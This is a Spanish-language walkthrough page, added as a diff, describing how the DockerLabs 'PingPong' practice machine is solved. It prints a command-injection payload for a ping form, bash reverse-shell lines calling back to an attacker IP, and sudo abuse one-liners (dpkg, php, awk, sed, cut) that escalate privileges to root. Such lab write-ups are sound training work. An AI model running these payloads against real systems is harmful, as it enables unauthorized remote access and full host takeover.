@@ -1,0 +1,220 @@
+---
+title: PingPong
+description: Resolución completa de la máquina virtual *PingPong* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **PingPong**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servicio web en el puerto 5000 con una funcionalidad de ping vulnerable a **inyección de comandos**, permitiendo ejecución remota de comandos y obteniendo acceso como `freddy`.
+Una vez dentro, se encadena una escalada progresiva a través de múltiples usuarios mediante configuraciones inseguras de `sudo`: `freddy` → `bobby` (dpkg), `bobby` → `gladys` (php), `gladys` → `chocolatito` (cut), `chocolatito` → `theboss` (awk), y `theboss` → `root` (sed).
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'PingPong',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '23/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip PingPong.zip
+sudo bash auto_deploy.sh PingPong.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p PingPong/{content,exploits,nmap,scripts}
+cd PingPong
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+* **443/tcp** — HTTPS
+* **5000/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764378353/Ports_gzihhh.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80,443,5000 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios. En el puerto 5000 se encuentra una página que permite ejecutar pings:
+
+![Ping](https://res.cloudinary.com/dewqswzke/image/upload/v1764378351/Ping_mihvd8.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Inyección de comandos
+
+La funcionalidad de ping no valida la entrada:
+
+```
+IP; id
+```
+
+![ID RCE](https://res.cloudinary.com/dewqswzke/image/upload/v1764378354/Id_asvtil.png)
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se envía el payload:
+
+```bash
+; bash -i >& /dev/tcp/172.17.0.1/443 0>&1
+```
+
+![Freddy](https://res.cloudinary.com/dewqswzke/image/upload/v1764378351/Reverse_xmxxju.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De freddy → bobby
+
+```bash
+sudo -l
+```
+
+![Sudo -l freddy](https://res.cloudinary.com/dewqswzke/image/upload/v1764378353/Sudo-lFreddy_erhzqi.png)
+
+```bash
+sudo -u bobby dpkg -l
+! /bin/sh
+```
+
+![Bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1764378350/Bobby_yvrq3i.png)
+
+### 3.2 De bobby → gladys
+
+```bash
+sudo -l
+```
+
+![Sudo -l bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1764378353/Sudo-lBobby_x9bguw.png)
+
+```bash
+sudo -u gladys php -r "system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/443 0>&1\"');"
+```
+
+### 3.3 De gladys → chocolatito
+
+```bash
+sudo -l
+```
+
+![Sudo -l gladys](https://res.cloudinary.com/dewqswzke/image/upload/v1764378354/Sudo-lGladys_nbdxvy.png)
+
+Se lee `/opt/chocolatitocontraseña.txt`:
+
+```bash
+sudo -u chocolatito /usr/bin/cut -d "" -f1 "/opt/chocolatitocontraseña.txt"
+su chocolatito
+```
+
+### 3.4 De chocolatito → theboss
+
+```bash
+sudo -l
+```
+
+![Sudo -l chocolatito](https://res.cloudinary.com/dewqswzke/image/upload/v1764378353/Sudo-lChocolatito_vkf03i.png)
+
+```bash
+sudo -u theboss awk 'BEGIN {system("/bin/bash")}'
+```
+
+![Theboss](https://res.cloudinary.com/dewqswzke/image/upload/v1764378355/TheBoss_nzvak2.png)
+
+### 3.5 De theboss → root
+
+```bash
+sudo -l
+```
+
+![Sudo -l theboss](https://res.cloudinary.com/dewqswzke/image/upload/v1764378354/Sudo-lTheBoss_umvotm.png)
+
+```bash
+sudo sed -n '1e exec sh 1>&0' /etc/hosts
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764378353/Root_srelyt.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Inyección de comandos en formulario de ping",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como freddy"
+    },
+    {
+      vulnerability: "Múltiples configuraciones inseguras de sudo",
+      severity: "Crítica",
+      impact: "Escalada progresiva de privilegios a root"
+    },
+    {
+      vulnerability: "Credenciales almacenadas en texto plano",
+      severity: "Alta",
+      impact: "Movimiento lateral a chocolatito"
+    }
+  ]}
+/>
